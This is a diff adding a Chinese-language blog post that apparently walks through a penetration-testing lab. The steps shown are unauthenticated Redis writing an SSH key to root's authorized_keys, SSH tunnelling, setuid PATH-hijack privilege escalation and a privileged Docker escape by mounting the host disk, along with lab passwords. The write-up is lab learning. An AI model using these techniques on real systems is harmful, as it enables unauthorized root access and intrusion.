@@ -1,0 +1,437 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>休比大王 | 休比大王</title><meta name="author" content="xiubi"><meta name="copyright" content="xiubi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="渗透世界环境搭建 ubuntu1关闭防火墙并且开启redis服务 iptables -F 1redis-server /etc/redis.conf   拿到root权限，并启动nginx权限 1/usr/sbin/nginx -c /etc/nginx/nginx.conf  ubuntu2通过docker ps -a去执行 123sudo susudo docker start 8e1728">
+<meta property="og:type" content="article">
+<meta property="og:title" content="休比大王">
+<meta property="og:url" content="https://xiubi1125.github.io/2026/07/16/%E6%B8%97%E9%80%8F%E4%B8%96%E7%95%8C/index.html">
+<meta property="og:site_name" content="休比大王">
+<meta property="og:description" content="渗透世界环境搭建 ubuntu1关闭防火墙并且开启redis服务 iptables -F 1redis-server /etc/redis.conf   拿到root权限，并启动nginx权限 1/usr/sbin/nginx -c /etc/nginx/nginx.conf  ubuntu2通过docker ps -a去执行 123sudo susudo docker start 8e1728">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xiubi1125.github.io/img/tx.jpg">
+<meta property="article:published_time" content="2026-07-16T06:37:21.990Z">
+<meta property="article:modified_time" content="2026-07-16T06:37:22.667Z">
+<meta property="article:author" content="xiubi">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xiubi1125.github.io/img/tx.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "",
+  "url": "https://xiubi1125.github.io/2026/07/16/%E6%B8%97%E9%80%8F%E4%B8%96%E7%95%8C/",
+  "image": "https://xiubi1125.github.io/img/tx.jpg",
+  "datePublished": "2026-07-16T06:37:21.990Z",
+  "dateModified": "2026-07-16T06:37:22.667Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "xiubi",
+      "url": "https://xiubi1125.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/dancing.png"><link rel="canonical" href="https://xiubi1125.github.io/2026/07/16/%E6%B8%97%E9%80%8F%E4%B8%96%E7%95%8C/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '休比大王',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/modify.css"><link rel="stylesheet" href="/css/1.css"><link rel="stylesheet" href="/css/2.css"><link rel="stylesheet" href="/css/3.css"><link rel="stylesheet" href="/css/4.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-butterfly-categories-card/lib/categorybar.css"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="休比大王" type="application/atom+xml">
+</head><body><div id="web_bg" style="background-image: url(/img/qz.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/tx.jpg" onerror="this.onerror=null;this.src='/img/yu.jpg'" alt="avatar"></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 老酒街</span></a></div><div class="menus_item"><a class="site-page" href="/shuoshuo/"><i class="fa-fw far fa-comments"></i><span> 夜雨</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/dancing.png" alt="Logo"><span class="site-name">休比大王</span></a><a class="nav-page-title" href="/"><span class="site-name">休比大王</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 老酒街</span></a></div><div class="menus_item"><a class="site-page" href="/shuoshuo/"><i class="fa-fw far fa-comments"></i><span> 夜雨</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">无标题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-07-16T06:37:21.990Z" title="发表于 2026-07-16 14:37:21">2026-07-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-07-16T06:37:22.667Z" title="更新于 2026-07-16 14:37:22">2026-07-16</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p><img src="/../typora-user-images/image-20260715142843833.png" alt="image-20260715142843833"></p>
+<h1 id="渗透世界"><a href="#渗透世界" class="headerlink" title="渗透世界"></a>渗透世界</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20260709145338087.png" alt="image-20260709144833344"></p>
+<p>ubuntu1关闭防火墙并且开启redis服务</p>
+<p>iptables -F</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server /etc/redis.conf</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20260709145609050.png" alt="image-20260709145608941"></p>
+<p>拿到root权限，并启动nginx权限</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/nginx -c /etc/nginx/nginx.conf</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="ubuntu2"><a href="#ubuntu2" class="headerlink" title="ubuntu2"></a>ubuntu2</h3><p>通过docker ps -a去执行</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">sudo docker start 8e172820ac78</span><br><span class="line">docker ps -a</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/../typora-user-images/image-20260709161853333.png" alt="image-20260709161853333"></p>
+<h3 id="pc1"><a href="#pc1" class="headerlink" title="pc1"></a>pc1</h3><p>关闭防火墙</p>
+<p><img src="/../typora-user-images/image-20260709162305320.png" alt="image-20260709162305320"></p>
+<p>Administrator 密码 Whoami2021</p>
+<p><img src="/../typora-user-images/image-20260709162528605.png" alt="image-20260709162528605"></p>
+<h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20260709182815812.png" alt="image-20260709182121142"></p>
+<p>开放Redis 192.168.111.1:6379 </p>
+<p>​         Redis 192.168.111.128:6379 发现未授权访问</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20260709182813856.png" alt="image-20260709182335495"></p>
+<p>192.168.111.1的config get dir显示是windows</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20260709182812405.png" alt="image-20260709182500216"></p>
+<p><img src="/../typora-user-images/image-20260709182708117.png" alt="image-20260709182708117"></p>
+<p>同时端口开放22 所以可以Redis 写 SSH 公钥</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 2048 -f /root/.ssh/redis_key -N ""</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20260709183007841.png" alt="image-20260709183007625"></p>
+<p>/root/.ssh/redis_key      私钥，自己留着<br>/root/.ssh/redis_key.pub  公钥，要写到目标</p>
+<p>写入公钥</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") &gt; key.txt</span><br></pre></td></tr></tbody></table></figure>
+
+<p>前后加空行是为了让 SSH 更容易识别到中间那一行公钥</p>
+<p>把公钥内容写进 Redis 的一个 key：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat key.txt | redis-cli -h 192.168.111.128 -x set xxx</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20260709183148397.png" alt="image-20260709183148318"></p>
+<p>进入 Redis：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.111.128</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh/   将写的目录设置在/root/.ssh/下</span><br><span class="line">config set dbfilename authorized_keys  生成一个authorized_keys</span><br><span class="line">save  保存 他会把你变量值也保存在authorized_keys</span><br><span class="line">exit 退出</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20260709183237703.png" alt="image-20260709183237646"></p>
+<p>尝试登陆</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 /root/.ssh/redis_key</span><br><span class="line">ssh -i /root/.ssh/redis_key root@192.168.111.128</span><br><span class="line">密码123456</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20260709183327191.png" alt="image-20260709183327075"></p>
+<p>基础信息收集</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ip a</span><br><span class="line">ip route</span><br><span class="line">ss -tulpen</span><br><span class="line">ps aux</span><br><span class="line">cat /etc/passwd</span><br><span class="line">ls -la /</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这里会发现这台主机有双网卡 由此判断该机器不仅位于外层 192.168.111.0/24，还连接了内网 192.168.52.0/24，可以作为进入 52 网段的跳板。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ens33: 192.168.111.128/24</span><br><span class="line">ens38: 192.168.52.10/24</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip neigh</span><br><span class="line">arp -a</span><br></pre></td></tr></tbody></table></figure>
+
+<p>查看arp缓存和邻居表</p>
+<p>可以看到内网的主机</p>
+<p>探测52整个网段可以发现还有台30</p>
+<p>两台主机均可达，其中 192.168.52.20 的 TTL 为 64，判断为 Linux 主机；192.168.52.30 的 TTL 为 128，判断为 Windows 主机。</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20260714150801772.png" alt="image-20260714150801639"></p>
+<p><img src="/../typora-user-images/image-20260710183434681.png" alt="image-20260710183434681"></p>
+<p> 扫描一下端口</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">192.168.52.20:22 open</span><br><span class="line">192.168.52.20:8000 open</span><br><span class="line">192.168.52.30:135 open</span><br><span class="line">192.168.52.30:139 open</span><br><span class="line">192.168.52.30:445 open</span><br><span class="line">192.168.52.30:8080 open</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20260714154035500.png" alt="image-20260714154035318"></p>
+<p><img src="/../typora-user-images/image-20260714150424786.png" alt="image-20260714150424786"></p>
+<p>提权</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20260714180030960.png"></p>
+<p>开个隧道</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20260714180434575.png" alt="image-20260714180434472"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 8088:192.168.52.30:8080 root@192.168.111.128</span><br></pre></td></tr></tbody></table></figure>
+
+<p>打开</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20260714180510315.png" alt="image-20260714180509891"></p>
+<p>然后这里卡了好久 靶场本身应该有个预留的后门文件 我的一直没有 </p>
+<p>干脆进容器给自己写了个后门进去 然后yijian连接</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20260714191202906.png" alt="image-20260714191202708"></p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20260714192041761.png" alt="image-20260714192041721"></p>
+<p>然后这个是一个比较低权限的</p>
+<p>而且这个进来之后会发现他就是一个docker容器 ipa啥的都没有</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20260714192417581.png" alt="image-20260714192417503"></p>
+<p>所以要考虑尝试docker逃逸</p>
+<h2 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h2><p>如何判断当前机器是否为docker容器</p>
+<h3 id="1-dockerenv"><a href="#1-dockerenv" class="headerlink" title="1  .dockerenv"></a>1  .dockerenv</h3><p>是 Docker 容器根目录下经常出现的一个标记文件。很多 Docker 运行时会在容器根文件系统里放这个文件，所以：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la /.dockerenv</span><br></pre></td></tr></tbody></table></figure>
+
+<p>如果存在，基本可以认为“当前进程处在 Docker 容器里”。</p>
+<h3 id="2-proc-1-cgroup"><a href="#2-proc-1-cgroup" class="headerlink" title="2    /proc/1/cgroup"></a>2    <strong>/proc/1/cgroup</strong></h3><p>描述某个进程所属的 cgroup</p>
+<p>容器运行时通常会把容器进程放入单独 cgroup，例如历史上常见：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">12:memory:/docker/&lt;container_id&gt; </span><br><span class="line">1:name=systemd:/docker/&lt;container_id&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>很多检测脚本会做</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/1/cgroup</span><br><span class="line">cat /proc/self/cgroup</span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后匹配</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker</span><br><span class="line">kubepods</span><br><span class="line">containerd</span><br><span class="line">libpod</span><br><span class="line">lxc</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="3-container-环境变量"><a href="#3-container-环境变量" class="headerlink" title="3  container 环境变量"></a>3  <strong>container 环境变量</strong></h3><p>某些容器系统会设置环境变量</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">env | grep -i container</span><br><span class="line">tr '\0' '\n' &lt; /proc/1/environ | grep -i container</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">container=lxc</span><br><span class="line">container=podman</span><br><span class="line">container=systemd-nspawn</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>正常 Docker 容器和宿主机是隔离的，主要靠：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namespace cgroup capabilities seccomp/apparmor 文件系统隔离</span><br></pre></td></tr></tbody></table></figure>
+
+<p>但如果容器以 –privileged 方式启动，隔离会大幅削弱。容器内 root 可能拥有很多宿主机级别能力，比如：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CAP_SYS_ADMIN</span><br><span class="line">访问 /dev/sda1 等宿主机磁盘设备</span><br><span class="line">执行 mount</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这样就可以在容器里把宿主机磁盘挂载进来：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount /dev/sda1 /teach</span><br></pre></td></tr></tbody></table></figure>
+
+<p>一旦挂载成功，容器里访问 /teach，其实就是访问宿主机的 / 文件系统。</p>
+<h2 id="逃"><a href="#逃" class="headerlink" title="逃"></a>逃</h2><p>我们前面看开放端口 <strong>80/81 都是 Web 端口</strong></p>
+<p>多个 Web 端口同时存在时，第一反应就是要看 Web 服务怎么分流,比如</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">80 是什么站？</span><br><span class="line">81 是什么站？</span><br><span class="line">是不是同一个服务？</span><br><span class="line">是不是反向代理？</span><br><span class="line">是不是转发到后端？</span><br></pre></td></tr></tbody></table></figure>
+
+<p>80返回的是502</p>
+<p>说明前端nginx没问题 但是他代理的后端服务挂掉了</p>
+<p>所以看到 502，就应该想到：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里可能有 Nginx/反向代理 要看 proxy_pass 配置</span><br></pre></td></tr></tbody></table></figure>
+
+<p> 81 是 Laravel，但机器本身又是边界机</p>
+<p>Web1 有双网卡：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.111.128 192.168.52.10</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这说明它可能不是单纯 Web 服务器，而是 DMZ 边界转发机。<br>边界机上跑 Nginx 反代到内网 Web           </p>
+<p>查看nginx                                                                                                                                                        </p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20260715115343745.png" alt="image-20260715114731576"></p>
+<p>yijian连接不太稳定 这里进行反弹shell</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20260715142843928.png"></p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20260715142856214.png" alt="image-20260715142856132"></p>
+<p>查找能提权的命令或者文件</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20260715145939660.png" alt="image-20260715145939573"></p>
+<p>这个文件很明显不对劲</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20260715150037416.png" alt="image-20260715150037324"></p>
+<p>执行这个shell文件</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20260715150125531.png" alt="image-20260715150125463"></p>
+<p>/home/jobs/shell 是一个 Linux 64 位可执行程序<br>带 setuid 权限</p>
+<p>且shell 程序内部执行了一个ps</p>
+<p>依赖环境变量 PATH 去找 ps 命令</p>
+<p>所以可以利用 <strong>PATH 劫持</strong>：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">让它执行 ps 时，不执行系统的 /bin/ps 而是执行我们伪造的 /tmp/ps</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/../typora-user-images/image-20260715151420413.png" alt="image-20260715151420413"></p>
+<p>成功提权</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo "/bin/bash -p" &gt; ps</span><br><span class="line">chmod +x ps</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">which ps</span><br><span class="line">cd /home/jobs</span><br><span class="line">./shell</span><br><span class="line">id</span><br></pre></td></tr></tbody></table></figure>
+
+<p>注意到现在这个界面看着没有交互了</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c 'import pty; pty.spawn("/bin/bash")'</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这是个美化命令</p>
+<p>查看容器有没有特权模式</p>
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20260715154050576.png" alt="image-20260715154050473"></p>
+<p><code>CapEff: 0000003fffffffff</code> 是当前进程的 <strong>Effective Capability 位图</strong></p>
+<p>意味着该容器以类似 <code>--privileged</code> 或大量 <code>--cap-add</code> 的方式启动</p>
+<p>下面验证<strong>容器是否能直接看到宿主机的块设备。</strong></p>
+<p>正常的低权限容器通常只能看到自己的文件系统视图，不应该直接访问宿主机的 <code>/dev/sda</code>、<code>/dev/vda</code>、<code>/dev/nvme0n1</code> 等物理或虚拟磁盘。若 <code>fdisk -l</code> 能列出这些设备及其真实分区，就说明容器可能被授予了宿主机设备访问权限，隔离程度较弱。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20260715154422305.png" alt="image-20260715154422187"></p>
+<p>既然是特权模式，我们现在就可以直接通过挂载访问目标主机的磁盘文件了</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /teach </span><br><span class="line">mount /dev/sda1 /teach</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="在-web1-上生成-SSH-密钥"><a href="#在-web1-上生成-SSH-密钥" class="headerlink" title="在 web1 上生成 SSH 密钥"></a>在 web1 上生成 SSH 密钥</h3><p>因为最终是从 <strong>web1</strong> 连接目标主机，所以私钥必须保留在 web1：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t ed25519 -f /root/teach_key -N ''</span><br></pre></td></tr></tbody></table></figure>
+
+<p>/root/teach_key       私钥，只保留在 web1<br>/root/teach_key.pub   公钥，要写入目标主机</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/teach_key.pub</span><br></pre></td></tr></tbody></table></figure>
+
+<p>复制输出的完整一行，通常以 <code>ssh-ed25519</code> 开头</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINTmqwPMuw+43xIKVqcPgtinpIVj1SJ8H37Kn+8/yegK root@ubuntu</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20260715173404258.png" alt="image-20260715173404023"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINTmqwPMuw+43xIKVqcPgtinpIVj1SJ8H37Kn+8/yegK root@ubuntu</span><br></pre></td></tr></tbody></table></figure>
+
+
+
